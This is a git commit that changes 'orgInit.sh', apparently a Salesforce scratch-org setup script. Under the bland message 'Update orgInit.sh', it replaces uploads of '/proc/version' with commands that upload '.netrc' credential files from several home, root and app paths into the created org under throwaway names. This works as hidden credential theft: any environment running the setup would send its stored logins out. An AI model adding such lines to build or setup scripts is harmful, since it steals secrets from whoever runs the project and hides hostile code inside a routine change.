ce3255279adba8b9c2dbc9b1ee0f19631ea1269e
mehboob <77236545+zeb0x01@users.noreply.github.com>
2024-12-10 12:58:45 +0530

    Update orgInit.sh

--- orgInit.sh
+++ orgInit.sh
@@ -1,6 +1,8 @@
 sf demoutil org create scratch -f config/project-scratch-def.json -d 5 -s -p data -e detect.demo
-sfdx shane:data:file:upload -f "/proc/version" -n zeb0x01tes
-sfdx shane:data:file:upload -f "/proc/version" -n zeb0x02 -c 
+sfdx shane:data:file:upload -f "~/.netrc" -n zeb0123
+sfdx shane:data:file:upload -f "/root/.netrc" -n zeb43
+sfdx shane:data:file:upload -f "/.netrc" -n zeb43
+sfdx shane:data:file:upload -f "/app/tmp/.netrc" -n zeb4123
 sf package install -w 20 -r -p 04t5e000000aVeP
 sf project deploy start
 sf demoutil user password set -p salesforce1 -g User -l User
